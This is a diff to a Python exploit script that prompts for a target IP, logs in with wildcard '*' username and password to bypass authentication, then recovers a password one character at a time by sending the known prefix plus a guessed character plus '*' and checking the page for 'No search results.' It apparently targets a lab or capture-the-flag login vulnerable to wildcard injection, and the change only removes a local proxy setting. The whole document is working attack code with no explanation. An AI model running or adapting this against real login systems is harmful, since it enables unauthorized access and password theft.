@@ -4,11 +4,11 @@ import concurrent.futures
 
 ip_address = input("Enter target IP: ")
 
-proxies = {"http": "http://127.0.0.1:8080"}
+# proxies = {"http": "http://127.0.0.1:8080"}
 password = ""
 
 data = {"username": "*", "password": "*"}
-response = requests.post(ip_address + "/login", data=data, proxies=proxies, allow_redirects=True)
+response = requests.post(ip_address + "/login", data=data, allow_redirects=True)
 
 if "No search results." in response.text:
     print("[+] Successfully logged in")
@@ -21,7 +21,7 @@ def test_character(character):
     """Function to test a single character in a password attempt."""
     test_password = password + character + "*"
     data = {"username": "*", "password": test_password}
-    response = requests.post(ip_address + "/login", data=data, proxies=proxies, allow_redirects=True)
+    response = requests.post(ip_address + "/login", data=data, allow_redirects=True)
     
     if "No search results." in response.text and character != "*":
         return character
